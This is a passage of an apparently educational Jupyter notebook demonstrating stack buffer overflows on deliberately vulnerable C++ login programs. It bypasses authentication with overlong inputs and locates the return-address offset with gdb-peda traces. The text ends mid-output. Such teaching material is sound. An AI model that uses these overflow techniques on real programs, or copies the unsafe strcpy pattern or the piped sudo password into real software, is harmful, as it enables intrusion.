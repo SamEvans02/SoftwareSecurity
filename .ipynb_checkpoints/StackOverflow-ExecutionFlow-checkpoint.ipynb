{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow - Execution Flow Corruption\n",
    "- overrun in stack segment may lead to corruption in execution flow of the program\n",
    "- violates the integrity of the program itself\n",
    "\n",
    "## simple execution flow corruption demo\n",
    "- stack overflow may lead to memory corruption which may lead to the corruption of execution flow\n",
    "- let's use into auth_overflow.cpp program to demostrate a simple execution flow corruption"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/auth_overflow.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "bool check_authentication(char *password) {\r\n",
      "    bool auth_flag = 0;\r\n",
      "    char password_buffer[16];\r\n",
      "\r\n",
      "    strcpy(password_buffer, password);\r\n",
      "\r\n",
      "    if(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "        auth_flag = 1;\r\n",
      "    if(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "        auth_flag = 1;\r\n",
      "\r\n",
      "    return auth_flag;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    if(argc < 2) {\r\n",
      "        cout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "        exit(0);\r\n",
      "    }\r\n",
      "    if(check_authentication(argv[1])) {\r\n",
      "        cout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "        cout << \"      Access Granted.\\n\";\r\n",
      "        cout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "    } \r\n",
      "    else\r\n",
      "        cout << \"\\nAccess Denied.\\n\";\r\n",
      "    return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./booksrc/auth_overflow.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# let's compile auth_overflow.cpp\n",
    "! echo kali | sudo -S ./compile.sh auth_overflow.cpp auth_overflow.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./auth_overflow.exe password\r\n"
     ]
    }
   ],
   "source": [
    "# run the program; gives help on how to run it properly\n",
    "! ./auth_overflow.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# authenticate with password, outgrabe\n",
    "! ./auth_overflow.exe outgrabe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# authenticate with password, brillig\n",
    "! ./auth_overflow.exe brillig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n"
     ]
    }
   ],
   "source": [
    "# any other password shouldn't work!\n",
    "! ./auth_overflow.exe letmein"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### let's authenticate without real password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n"
     ]
    }
   ],
   "source": [
    "# since password_buffer is 16 bytes, let's provide 16 As as password\n",
    "! ./auth_overflow.exe $(python -c 'print(\"A\"*16)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# how about 17 As?\n",
    "! ./auth_overflow.exe $(python -c 'print(\"A\"*17)')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### draw stack of check_authentication( ) to explain why 17As let's you in!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### examine stack using gdb-peda\n",
    "- run the program in GDB to see the address of auth_flag relative to that of password_buffer\n",
    "- peda will show address of both password_buffer and auth_flag in stack context\n",
    "- observe the value of auth_flag; any int value otherthan 0 is treated as true!\n",
    "\n",
    "```bash\n",
    "$ gdb -q auth_overflow.exe\n",
    "$ break check_authentication\n",
    "$ run $(python3 -c 'print(\"A\"*17)')\n",
    "$ next i\n",
    "$ x/s password_buffer\n",
    "$ x/x &auth_flag\n",
    "$ p/a &password_buffer\n",
    "$ p/d auth_flag\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### variables declaration order changed\n",
    "- can you overflow if the variable declaration orders are switched?\n",
    "- normally, variables are pushed on the stack as they're loaded from top to bottom\n",
    "    - the last variable decalred will be pushed last on the top of the stack\n",
    "- compile and examine booksrc/auth_overflow2.cpp\n",
    "- draw stack\n",
    "- verify it using GDB"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# copy booksrc/auth_overflow2.cpp\n",
    "! cp ./booksrc/auth_overflow2.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "bool check_authentication(char *password) {\r\n",
      "    char password_buffer[16];\r\n",
      "    bool auth_flag = 0;\r\n",
      "\r\n",
      "    strcpy(password_buffer, password);\r\n",
      "\r\n",
      "    if(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "        auth_flag = 1;\r\n",
      "    if(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "        auth_flag = 1;\r\n",
      "\r\n",
      "    return auth_flag;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    if(argc < 2) {\r\n",
      "        cout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "        exit(0);\r\n",
      "    }\r\n",
      "    if(check_authentication(argv[1])) {\r\n",
      "        cout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "        cout << \"      Access Granted.\\n\";\r\n",
      "        cout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "    } \r\n",
      "    else\r\n",
      "        cout << \"\\nAccess Denied.\\n\";\r\n",
      "    return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "# let's see the source code of booksrc/auth_overflow2.c\n",
    "! cat auth_overflow2.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile the program\n",
    "! ./compile.sh booksrc/auth_overflow2.cpp auth_overflow2.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# run the program with 17As\n",
    "! ./auth_overflow2.exe $(python3 -c 'print(\"A\"*17, end=\"\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### well, how is it possible?\n",
    "- see in gdb where auth_flag is compared to password_buffer\n",
    "- turns out auth_flag is still at higher address (pushed before) compared to password_buffer\n",
    "- compiler optimization is a plausible answer\n",
    "- if auth_flag is in lower address compared to password_buffer, you can't overwrite it by oveflowing password_buffer\n",
    "\n",
    "## Execution flow with function call\n",
    "- when a caller calls a function, program execution enters the function and exectues each line of code inside function\n",
    "- callee function must return back the execution to its caller\n",
    "- caller pushes return address to the calee's stack, so the calle knows where to return to and continue execution in caller\n",
    "\n",
    "### overwrite the caller's return address\n",
    "- what if the buffer is overflown to corrupt the caller's return address with something else?\n",
    "- if the return address is not valid, program will segfault\n",
    "- if the return address is a valid one, program will execute the code in that controlled return address!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### could return to \"    access granted     \" line!\n",
    "- find the address add esp, 0x10 before the addres to \"access granted\"\n",
    "- overflow the buffer and and overwrite the return address with the address that prints \"access granted\"\n",
    "- overflow the return address to bypass check_authentication() condition in main and directly execute the true block\n",
    "- possible in older gcc/assembly version (Hacking LiveCD)\n",
    "- couldn't get it to work on newer system (tested on Kali!\n",
    "- let's assemble and look at the return instruction...\n",
    "- repeated instructions: add esp, 0x10 and sub esp, 0xc etc. makes it hard to jump into the right instruction\n",
    "\n",
    "### control return to the function of user's choice?\n",
    "- this technique is fairly straigtforward and just works!\n",
    "- find the address of the function of your choice in the program and overwrite the caller's return address to the controlled function's address\n",
    "- let's look at auth_overflow3.cpp program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp booksrc/auth_overflow3.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void valid() {\r\n",
      "    cout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "    cout << \"      Access Granted.\\n\";\r\n",
      "    cout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "}\r\n",
      "\r\n",
      "void invalid() {\r\n",
      "    cout << \"\\nAccess Denied.\\n\";\r\n",
      "    cout << \"Try again...\\n\";\r\n",
      "}\r\n",
      "\r\n",
      "int check_authentication(char *password) {\r\n",
      "    char password_buffer[16];\r\n",
      "\r\n",
      "    strcpy(password_buffer, password);\r\n",
      "\r\n",
      "    if(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "        return true;\r\n",
      "    if(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "        return true;\r\n",
      "\r\n",
      "    return false;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    if(argc < 2) {\r\n",
      "        cout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "        exit(0);\r\n",
      "    }\r\n",
      "    if(check_authentication(argv[1]))\r\n",
      "        valid();\r\n",
      "    else\r\n",
      "        invalid();\r\n",
      "        \r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat auth_overflow3.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh auth_overflow3.cpp auth_overflow3.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n",
      "Try again...\r\n"
     ]
    }
   ],
   "source": [
    "! ./auth_overflow3.exe $(python -c 'print(\"A\"*17)')\n",
    "# no overflow!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./auth_overflow3.exe $(python -c 'print(\"A\"*100)')\n",
    "# segfault! see on terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ ./auth_overflow3.exe $(python -c 'print(\"A\"*100)')\n",
    "Segmentation fault\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Examine program execution and return address\n",
    "\n",
    "- let's load the program in gdb to examine memory address, esp. the caller's return address\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ gdb -q auth_overflow3.exe\n",
    "Reading symbols from auth_overflow3.exe...\n",
    "```\n",
    "\n",
    "- let's set two breakpoints one at main and the other at check_authentication function\n",
    "\n",
    "```bash\n",
    "gdb-peda$ break main\n",
    "Breakpoint 1 at 0x80492ef: file auth_overflow3.cpp, line 31.\n",
    "\n",
    "gdb-peda$ break check_authentication\n",
    "Breakpoint 2 at 0x8049271: file auth_overflow3.cpp, line 20.\n",
    "```\n",
    "- let's run the program with 100 junk bytes (As will do it!)\n",
    "- junk must be large enough to overwrite the return address\n",
    "- typically big enough to overwrite the buffer and the local variables if they're pushed -below the buffer + 8 bytes\n",
    "- 100 bytes should be more than enough to overflow 16 bytes password buffer and the return address\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run $(python -c 'print(\"A\"*100)')\n",
    "\n",
    "Starting program: /home/kali/projects/Hacking-CPP-Notebooks/auth_overflow3.exe $(python -c 'print(\"A\"*100)')\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xf7de8ae8 --> 0xffffc400 --> 0xffffc6ed (\"SHELL=/bin/bash\")\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc350 --> 0x2 \n",
    "EDX: 0xffffc384 --> 0x0 \n",
    "ESI: 0xffffc350 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc338 --> 0x0 \n",
    "ESP: 0xffffc320 --> 0x2 \n",
    "EIP: 0x80492ef (<main(int, char**)+32>: cmp    DWORD PTR [esi],0x1)\n",
    "EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x80492e2 <main(int, char**)+19>:    call   0x80490f0 <__x86.get_pc_thunk.bx>\n",
    "   0x80492e7 <main(int, char**)+24>:    add    ebx,0x2d19\n",
    "   0x80492ed <main(int, char**)+30>:    mov    esi,ecx\n",
    "=> 0x80492ef <main(int, char**)+32>:    cmp    DWORD PTR [esi],0x1\n",
    "   0x80492f2 <main(int, char**)+35>:    jg     0x804933c <main(int, char**)+109>\n",
    "   0x80492f4 <main(int, char**)+37>:    sub    esp,0x8\n",
    "   0x80492f7 <main(int, char**)+40>:    lea    eax,[ebx-0x1f75]\n",
    "   0x80492fd <main(int, char**)+46>:    push   eax\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc320 --> 0x2 \n",
    "0004| 0xffffc324 --> 0xffffc3f4 --> 0xffffc64b (\"/home/kali/projects/Hacking-CPP-Notebooks/auth_overflow3.exe\")\n",
    "0008| 0xffffc328 --> 0xffffc400 --> 0xffffc6ed (\"SHELL=/bin/bash\")\n",
    "0012| 0xffffc32c --> 0xffffc350 --> 0x2 \n",
    "0016| 0xffffc330 --> 0x0 \n",
    "0020| 0xffffc334 --> 0xf7de6000 --> 0x1e4d6c \n",
    "0024| 0xffffc338 --> 0x0 \n",
    "0028| 0xffffc33c --> 0xf7c1fdf6 (<__libc_start_main+262>:       add    esp,0x10)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "\n",
    "Breakpoint 1, main (argc=0x2, argv=0xffffc3f4) at auth_overflow3.cpp:31\n",
    "31          if(argc < 2) {\n",
    "```\n",
    "- enter next or n for short to execute next instruction; keep entering next and stop when the instruction: **strcpy(password_buffer, password);** is exectued\n",
    "- the password passed to the function will have been copied to **password_buffer** local variable\n",
    "\n",
    "```bash\n",
    "gdb-peda$ n\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xf7de8ae8 --> 0xffffc400 --> 0xffffc6ed (\"SHELL=/bin/bash\")\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc350 --> 0x2 \n",
    "EDX: 0xffffc384 --> 0x0 \n",
    "ESI: 0xffffc350 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc338 --> 0x0 \n",
    "ESP: 0xffffc320 --> 0x2 \n",
    "EIP: 0x804933c (<main(int, char**)+109>:        mov    eax,DWORD PTR [esi+0x4])\n",
    "EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x8049332 <main(int, char**)+99>:    sub    esp,0xc\n",
    "   0x8049335 <main(int, char**)+102>:   push   0x0\n",
    "   0x8049337 <main(int, char**)+104>:   call   0x8049070 <exit@plt>\n",
    "=> 0x804933c <main(int, char**)+109>:   mov    eax,DWORD PTR [esi+0x4]\n",
    "   0x804933f <main(int, char**)+112>:   add    eax,0x4\n",
    "   0x8049342 <main(int, char**)+115>:   mov    eax,DWORD PTR [eax]\n",
    "   0x8049344 <main(int, char**)+117>:   sub    esp,0xc\n",
    "   0x8049347 <main(int, char**)+120>:   push   eax\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc320 --> 0x2 \n",
    "0004| 0xffffc324 --> 0xffffc3f4 --> 0xffffc64b (\"/home/kali/projects/Hacking-CPP-Notebooks/auth_overflow3.exe\")\n",
    "0008| 0xffffc328 --> 0xffffc400 --> 0xffffc6ed (\"SHELL=/bin/bash\")\n",
    "0012| 0xffffc32c --> 0xffffc350 --> 0x2 \n",
    "0016| 0xffffc330 --> 0x0 \n",
    "0020| 0xffffc334 --> 0xf7de6000 --> 0x1e4d6c \n",
    "0024| 0xffffc338 --> 0x0 \n",
    "0028| 0xffffc33c --> 0xf7c1fdf6 (<__libc_start_main+262>:       add    esp,0x10)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "35          if(check_authentication(argv[1]))\n",
    "gdb-peda$ n\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xffffc688 ('A' <repeats 100 times>)\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc350 --> 0x2 \n",
    "EDX: 0xffffc384 --> 0x0 \n",
    "ESI: 0xffffc350 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc308 --> 0xffffc338 --> 0x0 \n",
    "ESP: 0xffffc2f0 --> 0x0 \n",
    "EIP: 0x8049271 (<_Z20check_authenticationPc+18>:        sub    esp,0x8)\n",
    "EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x8049263 <_Z20check_authenticationPc+4>:    sub    esp,0x14\n",
    "   0x8049266 <_Z20check_authenticationPc+7>:    call   0x80490f0 <__x86.get_pc_thunk.bx>\n",
    "   0x804926b <_Z20check_authenticationPc+12>:   add    ebx,0x2d95\n",
    "=> 0x8049271 <_Z20check_authenticationPc+18>:   sub    esp,0x8\n",
    "   0x8049274 <_Z20check_authenticationPc+21>:   push   DWORD PTR [ebp+0x8]\n",
    "   0x8049277 <_Z20check_authenticationPc+24>:   lea    eax,[ebp-0x18]\n",
    "   0x804927a <_Z20check_authenticationPc+27>:   push   eax\n",
    "   0x804927b <_Z20check_authenticationPc+28>:   call   0x8049090 <strcpy@plt>\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc2f0 --> 0x0 \n",
    "0004| 0xffffc2f4 --> 0x2 \n",
    "0008| 0xffffc2f8 --> 0xffffc318 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0012| 0xffffc2fc --> 0x80493ed (<_GLOBAL__sub_I__Z5validv()+31>:        add    esp,0x10)\n",
    "0016| 0xffffc300 --> 0x1 \n",
    "0020| 0xffffc304 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0024| 0xffffc308 --> 0xffffc338 --> 0x0 \n",
    "0028| 0xffffc30c --> 0x804934d (<main(int, char**)+126>:        add    esp,0x10)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "\n",
    "Breakpoint 2, check_authentication (password=0xffffc688 'A' <repeats 100 times>) at auth_overflow3.cpp:20\n",
    "20          strcpy(password_buffer, password);\n",
    "gdb-peda$ n\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc6e0 ('A' <repeats 12 times>)\n",
    "EDX: 0xffffc348 ('A' <repeats 12 times>)\n",
    "ESI: 0xffffc350 (\"AAAA\")\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc308 ('A' <repeats 76 times>)\n",
    "ESP: 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "EIP: 0x8049283 (<_Z20check_authenticationPc+36>:        sub    esp,0x8)\n",
    "EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x804927a <_Z20check_authenticationPc+27>:   push   eax\n",
    "   0x804927b <_Z20check_authenticationPc+28>:   call   0x8049090 <strcpy@plt>\n",
    "   0x8049280 <_Z20check_authenticationPc+33>:   add    esp,0x10\n",
    "=> 0x8049283 <_Z20check_authenticationPc+36>:   sub    esp,0x8\n",
    "   0x8049286 <_Z20check_authenticationPc+39>:   lea    eax,[ebx-0x1f86]\n",
    "   0x804928c <_Z20check_authenticationPc+45>:   push   eax\n",
    "   0x804928d <_Z20check_authenticationPc+46>:   lea    eax,[ebp-0x18]\n",
    "   0x8049290 <_Z20check_authenticationPc+49>:   push   eax\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "0004| 0xffffc2f4 ('A' <repeats 96 times>)\n",
    "0008| 0xffffc2f8 ('A' <repeats 92 times>)\n",
    "0012| 0xffffc2fc ('A' <repeats 88 times>)\n",
    "0016| 0xffffc300 ('A' <repeats 84 times>)\n",
    "0020| 0xffffc304 ('A' <repeats 80 times>)\n",
    "0024| 0xffffc308 ('A' <repeats 76 times>)\n",
    "0028| 0xffffc30c ('A' <repeats 72 times>)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "22          if(strcmp(password_buffer, \"brillig\") == 0)\n",
    "```\n",
    "\n",
    "- return address is always stored at EBP+4, so let's see that location\n",
    "\n",
    "```bash\n",
    "gdb-peda$ p $ebp+4\n",
    "$1 = (void *) 0xffffc30c\n",
    "```\n",
    "\n",
    "- now the 100As are copied to the password_buffer, let's examine 40 word bytes from top of the stack\n",
    "- 40w = 160 bytes that should display the location of caller's return address!\n",
    "- notice a bunch of Ox41 = A that are stored in stack\n",
    "\n",
    "```bash\n",
    "gdb-peda$ x/40wx $esp\n",
    "0xffffc2f0:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc300:     0x41414141      0x41414141      0x41414141      0x41414141 <- return address & 0xffffc30c\n",
    "0xffffc310:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc320:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc330:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc340:     0x41414141      0x41414141      0x41414141      0x41414141\n",
    "0xffffc350:     0x41414141      0xffffc300      0xffffc400      0xffffc384\n",
    "0xffffc360:     0xffffc394      0xf7ffdb40      0xf7fcbd10      0xf7de6000\n",
    "0xffffc370:     0x00000001      0x00000000      0xffffc3d8      0x00000000\n",
    "0xffffc380:     0xf7ffd000      0x00000000      0xf7de6000      0xf7de6000\n",
    "```\n",
    "- let's continue to the end of the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ c\n",
    "Continuing.\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x0 \n",
    "EBX: 0x41414141 ('AAAA')\n",
    "ECX: 0x6f ('o')\n",
    "EDX: 0xffffc2f0 ('A' <repeats 100 times>)\n",
    "ESI: 0xffffc350 (\"AAAA\")\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41414141 ('AAAA')\n",
    "ESP: 0xffffc310 ('A' <repeats 68 times>)\n",
    "EIP: 0x41414141 ('AAAA')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41414141\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc310 ('A' <repeats 68 times>)\n",
    "0004| 0xffffc314 ('A' <repeats 64 times>)\n",
    "0008| 0xffffc318 ('A' <repeats 60 times>)\n",
    "0012| 0xffffc31c ('A' <repeats 56 times>)\n",
    "0016| 0xffffc320 ('A' <repeats 52 times>)\n",
    "0020| 0xffffc324 ('A' <repeats 48 times>)\n",
    "0024| 0xffffc328 ('A' <repeats 44 times>)\n",
    "0028| 0xffffc32c ('A' <repeats 40 times>)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41414141 in ?? () <--------------------- 0x41414141 == AAAA\n",
    "```\n",
    "\n",
    "- since the caller's return address (0xffffc30c) is overwritten with AAAA, program crashes with segfault"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## let's find the offset\n",
    "\n",
    "- knowing the offset will help us overwrite the caller's return address with our controlled return address\n",
    "- let's use gdb-peda for this!\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ gdb -q auth_overflow3.exe\n",
    "Reading symbols from auth_overflow3.exe...\n",
    "```\n",
    "- create cyclic pattern of 100 bytes\n",
    "- pattern should be large enought to overwrite the return address and crash the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern create 100\n",
    "'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'\n",
    "```\n",
    "\n",
    "- let's create and store the pattern as argument to the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern arg 100\n",
    "Set 1 arguments to program\n",
    "```\n",
    "\n",
    "- let's run the program with the cyclic pattern as argumen\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run\n",
    "Starting program: /home/kali/projects/Hacking-CPP-Notebooks/auth_overflow3.exe 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x0                                                                               \n",
    "EBX: 0x41412d41 ('A-AA')\n",
    "ECX: 0x6f ('o')\n",
    "EDX: 0xffffc2f0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "ESI: 0xffffc350 (\"6AAL\")\n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x44414128 ('(AAD')\n",
    "ESP: 0xffffc310 (\"A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "EIP: 0x413b4141 ('AA;A')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x413b4141\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc310 (\"A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0004| 0xffffc314 (\"EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0008| 0xffffc318 (\"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
    "0012| 0xffffc31c (\"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\")\n",
